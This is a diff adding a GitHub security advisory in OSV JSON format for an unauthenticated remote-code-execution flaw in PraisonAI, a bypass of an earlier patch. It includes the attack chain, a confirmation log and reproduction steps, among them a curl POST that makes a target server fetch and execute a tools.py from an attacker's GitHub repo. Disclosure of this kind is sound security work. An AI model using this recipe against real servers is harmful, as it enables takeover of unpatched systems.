@@ -1,0 +1,80 @@
+{
+  "id": "GHSA-xcmw-grxf-wjhj",
+  "modified": "2026-05-06T22:22:06.178574Z",
+  "published": "2026-05-06T22:08:58Z",
+  "aliases": [
+    "CVE-2026-44334"
+  ],
+  "summary": "PraisonAI has unauthenticated RCE via `tool_override.py` (CVE-2026-40287 patch bypass)",
+  "details": "## TL;DR\n\nCVE-2026-40287's fix gated `tools.py` auto-import behind `PRAISONAI_ALLOW_LOCAL_TOOLS=true` in **two** files (`tool_resolver.py`, `api/call.py`). A **third** import sink in `praisonai/templates/tool_override.py` was missed and remains unguarded. It is reached by the recipe runner on every recipe execution and is **remotely** triggerable through `POST /v1/recipes/run` with a `recipe` value pointing at any local absolute path *or* any GitHub repo (because `SecurityConfig.allow_any_github` defaults to `True`). The attacker drops a `tools.py` next to `TEMPLATE.yaml`; the server `exec_module()`s it. No auth required by default, no environment opt-in required.\n\n## Patch coverage gap\n\nCVE-2026-40287 was fixed in v4.5.139 by adding an env-var gate at:\n\n| File | Line | Gate |\n|---|---|---|\n| `praisonai/tool_resolver.py` | 77 | `if os.environ.get(\"PRAISONAI_ALLOW_LOCAL_TOOLS\", \"\").lower() != \"true\":` |\n| `praisonai/api/call.py` | 80 | same |\n\nBut the equivalent sinks in `praisonai/templates/tool_override.py` were **not** patched:\n\n```python\n# tool_override.py - create_tool_registry_with_overrides()\n332    cwd_tools_py = Path.cwd() / \"tools.py\"\n333    if cwd_tools_py.exists():\n334        try:\n335            tools = loader.load_from_file(str(cwd_tools_py))   # \u003c-- exec_module\n336            registry.update(tools)\n337        except Exception:\n338            pass\n339\n341    # 4. Template-local tools.py\n342    if template_dir:\n343        tools_py = Path(template_dir) / \"tools.py\"\n344        if tools_py.exists():\n345            try:\n346                tools = loader.load_from_file(str(tools_py))   # \u003c-- exec_module\n347                registry.update(tools)\n348            except Exception:\n349                pass\n```\n\n`load_from_file` (line 84-94) ends in `spec.loader.exec_module(module)` with no allowlist, no signature check, no env gate. Both call sites run unconditionally on every recipe execution.\n\n## Attack chain\n\n```\nHTTP POST /v1/recipes/run\n  body: {\"recipe\": \"\u003cabs path\u003e\" | \"github:\u003cowner\u003e/\u003crepo\u003e/\u003crecipe\u003e\"}\n        │\n        ▼\nrecipe/serve.py:483   run_recipe(request)              ← auth=none default\n        │\n        ▼\nrecipe/core.py:215    recipe.run(name, ...)\n        │\n        ▼\nrecipe/core.py:686    _load_recipe(name)\n                      └─ \"..\" check only; absolute paths and URIs allowed\n        │\n        ▼\ntemplates/loader.py:94    TemplateLoader.load(uri)\n        │\n        ▼\ntemplates/security.py:130 is_source_allowed(\"github:*\")\n                          └─ allow_any_github=True default → returns True\n        │\n        ▼\ntemplates/registry.py     fetch repo from raw.githubusercontent.com → cache dir\n        │\n        ▼\ntemplates/security.py:215 validate_template_directory(cached.path)\n                          └─ .py is in allowed_extensions → tools.py kept\n        │\n        ▼\nrecipe/core.py:887        _execute_recipe(recipe_config, ...)\n        │\n        ▼\nrecipe/core.py:943        create_tool_registry_with_overrides(\n                              include_defaults=True,\n                              template_dir=recipe_config.path)\n        │\n        ▼\ntemplates/tool_override.py:341-349   load_from_file(template_dir/tools.py)\n        │\n        ▼\ntemplates/tool_override.py:94        spec.loader.exec_module(module)   ← RCE\n```\n\nThe tool registry build runs *before* any LLM/agent step, so `OPENAI_API_KEY` and similar are not required. A recipe with an empty `workflow.steps: []` is sufficient - the payload fires during registry construction.\n\n## Confirmed execution (2026-04-25, praisonai 4.6.31)\n\n```\nSERVER stdout (PID 43784):\n  Uvicorn running on http://127.0.0.1:8765\n  127.0.0.1 - POST /v1/recipes/run HTTP/1.1\n  [CVE-2026-40287-bypass] RCE fired. Marker written to: …/praisonai_pwn_1777094071.txt\n  127.0.0.1 - \"POST /v1/recipes/run\" 500 Internal Server Error\n\nMarker file:\n  pid: 43784            ← matches server PID\n  argv: ['server.py']   ← server process, not exploit\n```\n\nThe 500 response is a downstream side-effect of `workflow.steps: []` failing to construct a runnable workflow; the `exec_module(tools.py)` call runs *before* that error. The attacker payload has already executed in the server process by the time the 500 is sent.\n\n## Reproduction (local-path variant)\n\nFiles under `pocs/praisonai-cve-2026-40287-bypass/`:\n\n- [evil_recipe/TEMPLATE.yaml](https://github.com/user-attachments/files/27079207/TEMPLATE.yaml) - minimal recipe metadata\n- [evil_recipe/tools.py](https://github.com/user-attachments/files/27079210/tools.py) - payload (writes a marker file in tempdir)\n- [server.py](https://github.com/user-attachments/files/27079211/server.py) - starts `praisonai.recipe.serve.create_app({})` on `127.0.0.1:8765` (default `auth: none`)\n- [exploit.py](https://github.com/user-attachments/files/27079214/exploit.py) - single POST to `/v1/recipes/run`\n\n```bash\npip install 'praisonai[serve]==4.6.31'\n\n# Terminal 1\npython server.py\n\n# Terminal 2\npython exploit.py\n```\n\nExpected: server stdout shows `[CVE-2026-40287-bypass] RCE fired.`; a `praisonai_pwn_\u003ctimestamp\u003e.txt` file appears in the system temp directory containing user, host, pid, cwd captured from inside the server process.\n\n## Reproduction (remote GitHub variant)\n\n```bash\n# Push evil_recipe/ to https://github.com/\u003cyou\u003e/poc-recipe (public repo)\n\ncurl -X POST http://target:8765/v1/recipes/run \\\n     -H 'Content-Type: application/json' \\\n     -d '{\"recipe\":\"github:\u003cyou\u003e/poc-recipe/poc-recipe\"}'\n```\n\nNo filesystem prerequisite on the target. Triggers because `SecurityConfig.allow_any_github` (templates/security.py:30) defaults to `True`.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "praisonai",
+        "purl": "pkg:pypi/praisonai"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "4.5.139"
+            },
+            {
+              "fixed": "4.6.32"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "4.5.139",
+        "4.5.140",
+        "4.5.143",
+        "4.5.144",
+        "4.5.145",
+        "4.5.149",
+        "4.6.10",
+        "4.6.11",
+        "4.6.12",
+        "4.6.13",
+        "4.6.14",
+        "4.6.15",
+        "4.6.16",
+        "4.6.18",
+        "4.6.19",
+        "4.6.20",
+        "4.6.21",
+        "4.6.22",
+        "4.6.23",
+        "4.6.24",
+        "4.6.25",
+        "4.6.26",
+        "4.6.27",
+        "4.6.28",
+        "4.6.29",
+        "4.6.30",
+        "4.6.31",
+        "4.6.9"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 4.6.31",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-xcmw-grxf-wjhj/GHSA-xcmw-grxf-wjhj.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-xcmw-grxf-wjhj"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/MervinPraison/PraisonAI"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-g985-wjh9-qxxc"
+    }
+  ]
+}
